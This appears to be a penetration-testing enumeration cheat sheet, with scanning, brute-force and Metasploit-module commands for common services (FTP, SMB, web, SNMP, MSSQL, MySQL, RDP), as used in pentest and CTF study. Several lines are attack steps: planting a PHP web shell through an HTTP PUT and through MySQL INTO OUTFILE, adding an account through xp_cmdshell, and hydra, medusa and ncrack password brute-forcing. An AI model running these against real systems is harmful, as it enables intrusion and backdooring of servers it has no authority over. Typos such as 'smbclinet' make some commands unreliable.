# Enum

## Scanning

---
> nmap -sC -sV -oN nmap/nmap $IP

- **sC** : Run default scripts
- **sV** : Determine service version info
- **oN** : Output in Normal

---
**NOTE**

Other useful flags:

**-Pn** : No Ping

**-p-** : Scan all ports

**-F** : Fast scan(100 ports only)

**-sn** : Disable port scan(Used when scanning for active hosts)

**-n** : No dns resolution

---

## FTP(21)

---
Try to connect to the service using `anonymous` user

> ftp $IP
> 
> username: anonymous
> 
> password: anonymous

To download files
> mget file-name

> nmap --script=ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-anon,ftp-libopie,,ftp-vuln-cve2010-4221,tftp-enum -p 21 -n -v -sV -Pn $IP

Metasploit Modules for FTP service;

- auxiliary/scanner/ftp/anonymous
- auxiliary/scanner/ftp/ftp_login
- auxiliary/scanner/ftp/ftp_version
- auxiliary/scanner/ftp/konica_ftp_traversal


## SSH(22)

---
> ssh $IP

> nmap -p 22 -n -v -sV -Pn --script ssh-auth-methods --script-args ssh.user=root $IP
> 
> nmap -p 22 -n -v -sV -Pn --script ssh-hostkey $IP 
> 
> nmap -p 22 -n -v -sV -Pn --script ssh-brute --script-args userdb=user_list.txt,passdb=password_list.txt $IP

Metasploit Modules for SSH service

- auxiliary/scanner/ssh/fortinet_backdoor
- auxiliary/scanner/ssh/juniper_backdoor
- auxiliary/scanner/ssh/ssh_enumusers
- auxiliary/scanner/ssh/ssh_identify_pubkeys
- auxiliary/scanner/ssh/ssh_login
- auxiliary/scanner/ssh/ssh_login_pubkey
- auxiliary/scanner/ssh/ssh_version

## SMPT(25)

---
> nmap --script=smtp-enum-users,smtp-commands,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764,smtp-vuln-cve2010-4344 -p 25 -n -v -sV -Pn $IP

Metasploit Modules for SMTP service;

- auxiliary/scanner/smtp/smtp_enum
- auxiliary/scanner/smtp/smtp_ntlm_domain
- auxiliary/scanner/smtp/smtp_relay
- auxiliary/scanner/smtp/smtp_version 

## DNS(53)

---
> dnsrecon -d $IP -t axfr
> 
> host -l test.com ns1.test.com
> 
> dig axfs test.com @ns1.test.com

### Windows
> nslookup -> set type=any -> ls -d test.com

> dnsrecon -d $IP -d /usr/share/wprdlists/dnsmap.txt -t std

## RCP(135)

---
> nmap -n -v -sV -Pn -p 135 --script=msrpc-enum $IP


Metasploit Exploit Module for Microsoft RPC service;

- exploit/windows/dcerpc/ms05_017_msmq


## SMB(139,445)

---
> enum4Linux -a $IP

> nbtscan $IP

> nmblookup -A $IP

> nmap -n -v -sV -Pn -p 445 --script=smb-ls,smb-mbenum,smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode,smbv2-enabled,smbv2-enabled,smb-vuln* $IP
>
> smbclient -L \\\\\\\\$IP
> 
> smbclinet \\\\\\\\$IP\\\\share
> 
> smbclinet \\\\\\\\$IP\\\\share -U uaername%password
>
> smbclinet \\\\\\\\$IP\\\\share -U username
>
> rpcclient -U "" $IP

- > srvinfo
- > enumdomusers
- > getdompwinfo //password policy
- > querydominfo
- > netshareenum

Metasploit Modules for Microsoft SMB service;

- auxiliary/scanner/smb/psexec_loggedin_users
- auxiliary/scanner/smb/smb_enumshares
- auxiliary/scanner/smb/smb_enumusers
- auxiliary/scanner/smb/smb_enumusers_domain
- auxiliary/scanner/smb/smb_login
- auxiliary/scanner/smb/smb_lookupsid
- auxiliary/scanner/smb/smb_ms17_010
- auxiliary/scanner/smb/smb_version


Use `get` to download file
> get file-name

## LDAP(389)

---
> ldapsearch -h $IP -p $PORT -x -s base

- **-x**: simple Auth
- **-s**: scope (base, one, sub)

> ldapsearch -LLL -x -H ldap://\<FQDN\> -b '' -s base '(objectclass=*)'

## Web(80,443)

---
> dirb http://$IP wordlist -o dirb/dirb

> nikto -host $IP:port

> curl -v -X PUT -d '<?php shell_exec($_GET["cmd"]); ?>' http://$IP/shell.php

> sqlmap -u http://$IP/ --crawl=5 --dbms=mysql

Create a wordlist from the provided url
> cewl http://$IP/ -m 6 -w special_wordlist.txt

Brute-force login page
> medusa -h $IP -u admin -P  wordlist.txt -M http -m DIR:/admin -T 10

> nmap -p 80 -n -v -sV -Pn --script http-backup-finder,http-config-backup,http-errors,http-headers,http-iis-webdav-vuln,http-internal-ip-disclosure,http-methods,http-php-version,http-qnap-nas-info,http-robots.txt,http-shellshock,http-slowloris-check,http-waf-detect,http-vuln* $IP

`HTTPs service enumeration`

> sslscan https://$IP/

## SNMP Enumeartion(161,162)

---
> nmap -n -vv -sV -sU -Pn -p 161,162 --script=snmp-processes,snmp-netstat $IP
> 
> onesixtyone -c communities.txt $IP
> 
> snmp-check -t $IP -c public
> 
> snmpwalk -c public -v 1 $IP [MIB_TREE_VALUE]
> 
> hydra -P passwords.txt -v $IP snmp

`Communities.txt`
public
private
community

### SNMP MIB Trees

1.3.6.1.2.1.25.1.6.0 System Processes
1.3.6.1.2.1.25.4.2.1.2 Running Programs
1.3.6.1.2.1.25.4.2.1.4 Processes Path
1.3.6.1.2.1.25.2.3.1.4 Storage Units
1.3.6.1.2.1.25.6.3.1.2 Software Name
1.3.6.1.4.1.77.1.2.25 User Accounts
1.3.6.1.2.1.6.13.1.3 TCP Local Ports

Metasploit Modules for SNMP service;

- auxiliary/scanner/snmp/snmp_enum
- auxiliary/scanner/snmp/snmp_enum_hp_laserjet
- auxiliary/scanner/snmp/snmp_enumshares
- auxiliary/scanner/snmp/snmp_enumusers
- auxiliary/scanner/snmp/snmp_login

## MsSQL(1433)

---
> nmap -n -v -sV -Pn -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt $IP
> 
> nmap -n -v -sV -Pn -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password  $IP
> 
> nmap -n -v -sV -Pn -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=SQL_USER,mssql.password=SQL_PASS,ms-sql-xp-cmdshell.cmd="net user lifeoverpentest MySecretPassword123 /add" $IP
> 
>sqsh -S $IP -U sa

Metasploit Modules for MsSQL service;

- auxiliary/scanner/mssql/mssql_login
- auxiliary/admin/mssql/mssql_exec
- auxiliary/admin/mssql/mssql_enum


## Wordpress

---
> wpscan --url url --enumarate u,ap --disable-tls-check --log dir

`User bruteforce`
> wpscan --url url --disable-tls-check --usernames user-file --wordlist password-file --log dir

**u**: For users
**ap**: For plugins

## NNFS(2049)

---
> nmap --script=nfs-ls $IP

> rpcinfo -p $IP

> showmount -e $IP

> showmount -a $IP

> mount -t nfs $IP:/sharedfolder /mnt/temp

## mySQL(3306)

---
> nmap -n -v -sV -Pn -p 3306 --script=mysql-info,mysql-audit,mysql-enum,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-users,mysql-query,mysql-variables,mysql-vuln-cve2012-2122 $IP
> 
> mysql  -h $IP -u user -p --execute="show databases"

Upload a shell
> mysql  -h $IP -u user -p

> mysql> SELECT "<?php system($_GET['cmd']);?>" into outfile "file-path"

`OR`

> myysql> \! /bin/bash

```file-path example: /var/www/https/blog/wp-content/uploads/backdoor.php```

Metasploit Modules for MySQL service;

- auxiliary/scanner/mysql/mysql_authbypass_hashdump
- auxiliary/scanner/mysql/mysql_login
- auxiliary/scanner/mysql/mysql_schemadump
- auxiliary/scanner/mysql/mysql_version
- auxiliary/scanner/mysql/mysql_writable_dirs

## Remote Desktop Service(3389)

---
> ncrack -vv --user administrator -P passwords.txt rdp://$IP,CL=1
> 
> rdesktop $IP
> 
> rdesktop -u guest -p guest $IP

Metasploit Modules for Remote Desktop service;

- auxiliary/scanner/rdp/ms12_020_check
- auxiliary/scanner/rdp/rdp_scanner 


## Random port or service

---
> netcat $IP $port


## Brute Forcing

---
> hydra -L username-file -P password-file -e nsr service://$IP
> 
> hydra -L username-file -P password-file -e nsr ftp://$IP
> 
> hydra -L username-file -P password-file -e nsr $IP ssh

- **-e** : extra checks
- **n** : null as password
- **s** : same as password(username)
- **r** : reverse as password(username)

> ncrack service_name://$IP:$PORT

Wordpress user bruteforce
> wpscan --url url --disable-tls-check --usernames user-file --wordlist password-file --log dir


## Password List

---
| darkc0de.txt |
----------------


## H2

### H3

**Text** BOLD

- FOR list
  
> FOR indentation

[<TEXT>](link) FOR Hyperlinks

![<TEXT>](link) FOR images
